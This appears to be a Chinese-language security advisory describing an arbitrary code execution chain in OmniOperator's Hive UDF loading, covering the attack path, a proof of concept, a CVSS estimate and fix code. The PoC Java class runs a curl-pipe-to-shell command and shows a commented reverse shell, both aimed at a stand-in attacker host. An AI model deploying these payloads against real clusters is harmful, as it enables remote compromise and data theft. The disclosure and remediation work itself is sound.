# VULN-XMOD-001：UDF链任意代码执行漏洞

## 漏洞概述

**漏洞类型**: 任意代码执行 (CWE-94)  
**严重级别**: Critical  
**置信度**: 85%  
**影响模块**: util, codegen, udf, jni_bindings

OmniOperator 的 Hive UDF 执行机制存在完整的跨模块攻击链，允许攻击者通过 SQL 查询中的 UDF 函数调用执行任意 Java 代码。漏洞涉及多个安全缺陷：

1. **DLLEXPORT 导出函数无验证**: `EvaluateHiveUdfSingle` 和 `EvaluateHiveUdfBatch` 是公开导出函数，直接接收 `udfClass` 参数
2. **UDF 类名无白名单**: 类名参数直接传递给 JNI，无任何验证
3. **静态初始化器先于检查执行**: Java 端 `Class.forName` 使用 `initialize=true`，静态初始化器在 UDF 类型检查前执行
4. **配置文件路径可被环境变量控制**: 攻击者可篡改配置文件注入恶意类名

## 漏洞触发条件

1. 攻击者能够提交包含 Hive UDF 函数调用的 SQL 查询
2. 攻击者能够控制 UDF 类名参数（通过配置文件篡改或直接调用 DLLEXPORT 函数）
3. 攻击者能够在指定目录放置恶意 Java 类文件

## 完整攻击路径

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Attack Flow                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│  1. 攻击者提交 SQL 查询                                                       │
│     SELECT my_malicious_udf(column) FROM table                               │
│                                                                              │
│  2. Spark/Hive 解析 SQL，生成查询计划                                         │
│     → JSON 格式表达式传递给 OmniOperator                                      │
│                                                                              │
│  3. OmniOperator JSON 解析                                                   │
│     → jsonparser.cpp: ParseJSONFunc()                                        │
│     → FuncExpr.funcName 存储 UDF 函数名                                       │
│                                                                              │
│  4. 函数注册查找                                                              │
│     → func_registry_hive_udf.cpp: LookupHiveUdf()                            │
│     → 从属性文件读取 udfClass 类名                                             │
│     【攻击点: 属性文件可能被篡改】                                             │
│                                                                              │
│  5. 代码生成                                                                  │
│     → expression_codegen.cpp: CreateConstantString(fExpr.funcName)           │
│     → 编译为 LLVM IR                                                          │
│                                                                              │
│  6. DLLEXPORT 入口 【关键攻击点】                                             │
│     → udffunctions.cpp:29 EvaluateHiveUdfSingle()                            │
│     → extern DLLEXPORT - 可被外部直接调用                                     │
│     → 无验证接收 udfClass 参数                                                │
│                                                                              │
│  7. JNI 执行层                                                               │
│     → java_udf_functions.cpp:42 ExecuteHiveUdfSingle()                       │
│     → line 55: jstring jUdfClassName = env->NewStringUTF(udfClass)           │
│     → 无验证直接传递                                                          │
│                                                                              │
│  8. Java 类加载 【最终攻击点】                                                │
│     → HiveUdfExecutor.java:169                                               │
│     → Class.forName(udfClassName, true, loader)                              │
│     → initialize=true → 静态初始化器立即执行                                  │
│     → 【任意代码执行发生】                                                    │
│                                                                              │
│  9. UDF 检查（太晚）                                                          │
│     → line 170: UDF.class.isAssignableFrom(udfClass)                         │
│     → 检查发生在静态初始化器执行之后                                           │
│     → 即使检查失败，恶意代码已执行                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 利用步骤 (PoC)

### 步骤 1: 创建恶意 Java 类

```java
// MaliciousUdf.java - 恶意 UDF 类
package attacker;

import org.apache.hadoop.hive.ql.exec.UDF;

public class MaliciousUdf extends UDF {
    // 静态初始化器 - 在类加载时立即执行
    static {
        try {
            // 执行任意命令
            Runtime.getRuntime().exec("/bin/sh -c 'curl attacker.com/shell.sh | sh'");
            // 或建立反向 Shell
            // Runtime.getRuntime().exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'");
        } catch (Exception e) {
            // 隐藏异常
        }
    }
    
    public String evaluate(String input) {
        return input; // 正常 UDF 函数
    }
}
```

### 步骤 2: 编译并部署恶意类

```bash
# 编译恶意类
javac -cp hive-exec.jar MaliciousUdf.java

# 打包为 JAR
jar cf malicious.jar attacker/MaliciousUdf.class

# 攻击者需要将 JAR 放置到 UDF 目录
# 方式 1: 环境变量控制配置文件路径
export OMNI_HOME=/tmp/attacker_controlled
# 方式 2: 直接写入 UDF 目录（需要文件系统访问）
cp malicious.jar /opt/hive_udf_dir/
```

### 步骤 3: 提交恶意 SQL 查询

```sql
-- 通过 SQL 调用恶意 UDF
SELECT attacker.MaliciousUdf(column_name) FROM target_table;

-- 或者绕过属性文件直接使用
SELECT some_udf(column) FROM table;  -- 配置文件中 udfClass=attacker.MaliciousUdf
```

### 步骤 4: 直接调用 DLLEXPORT 函数（高级攻击）

```cpp
// 攻击者可以直接调用导出函数，完全绕过属性文件白名单
extern void EvaluateHiveUdfSingle(
    int64_t contextPtr,
    const char *udfClass,  // "attacker.MaliciousUdf"
    ...
);

// 无需任何白名单验证，直接执行
EvaluateHiveUdfSingle(ctx, "attacker.MaliciousUdf", ...);
```

## 危害评估

### 直接危害
- **任意代码执行**: 攻击者可在 Spark/Hive Worker 节点上执行任意 Java 代码
- **反向 Shell**: 可建立与攻击者的远程连接
- **数据窃取**: 可读取本地文件系统上的所有数据
- **横向移动**: 可攻击同一集群中的其他节点

### 影响范围
- **大数据集群**: Spark/Hive 集群的所有 Worker 节点
- **敏感数据**: ORC/Parquet 文件中的业务数据
- **基础设施**: HDFS、YARN 等大数据组件

### CVSS 评分预估
- **攻击向量 (AV)**: Network (通过 SQL 查询)
- **攻击复杂度 (AC)**: Low (无需特殊条件)
- **权限要求 (PR)**: Low (需要 SQL 执行权限)
- **用户交互 (UI)**: None
- **影响范围**: Changed (影响大数据集群)
- **机密性影响**: High
- **完整性影响**: High
- **可用性影响**: High

**预估 CVSS 3.1 评分**: 9.0 (Critical)

## 修复建议

### 1. UDF 类名验证（优先级：高）

```cpp
// udffunctions.cpp - 添加白名单验证
static const std::set<std::string> ALLOWED_UDF_CLASSES = {
    "org.apache.hadoop.hive.ql.udf.generic.GenericUDF...",
    // 仅允许预定义的安全 UDF 类
};

extern DLLEXPORT void EvaluateHiveUdfSingle(int64_t contextPtr, const char *udfClass, ...) {
    // 添加白名单检查
    if (!ALLOWED_UDF_CLASSES.count(udfClass)) {
        SetError(contextPtr, "Unauthorized UDF class: " + std::string(udfClass));
        return;
    }
    // 原有逻辑
    ...
}
```

### 2. Java 端类名验证（优先级：高）

```java
// HiveUdfExecutor.java - 修改类加载逻辑
private static void executeSingle(URLClassLoader loader, String udfClassName, ...) {
    // 添加类名格式验证
    if (!isValidUdfClassName(udfClassName)) {
        throw new OmniRuntimeException(..., "Invalid UDF class name format");
    }
    
    // 关键修复：先检查类名是否在白名单中，再加载
    if (!isAllowedUdfClass(udfClassName)) {
        throw new OmniRuntimeException(..., "Unauthorized UDF class");
    }
    
    // 使用 initialize=false 先加载类但不初始化
    Class<?> udfClass = Class.forName(udfClassName, false, loader);
    
    // 先验证是否是合法 UDF
    if (!UDF.class.isAssignableFrom(udfClass)) {
        throw new OmniRuntimeException(..., "Class does not extend UDF");
    }
    
    // 验证通过后再初始化
    try {
        udfClass.newInstance();  // 安全初始化
    } catch (...) {
        ...
    }
}
```

### 3. 移除或限制 DLLEXPORT 函数（优先级：高）

```cpp
// 移除公开导出，改为内部调用
// extern DLLEXPORT void EvaluateHiveUdfSingle(...)  // 移除
static void EvaluateHiveUdfSingle(...)  // 改为 static 内部函数
```

### 4. 配置文件安全（优先级：中）

```cpp
// config_util.cpp - 添加配置文件签名验证
bool VerifyConfigSignature(const std::string& configPath) {
    // 验证配置文件签名，防止篡改
    ...
}
```

### 5. 安全审计日志（优先级：中）

```java
// 添加 UDF 执行审计
log.info("UDF execution: className={}, user={}, queryId={}", udfClassName, user, queryId);
```

## 相关漏洞

- VULN-SEC-UDF-001: 相同漏洞的不同报告
- VULN-SEC-UDF-004: DLLEXPORT 绕过白名单
- udf-001: 信任边界违规
- udf-005: 不安全类加载

## 参考信息

- CWE-94: Improper Control of Generation of Code ('Code Injection')
- OWASP: Code Injection Prevention Cheat Sheet
- Hive UDF Security Best Practices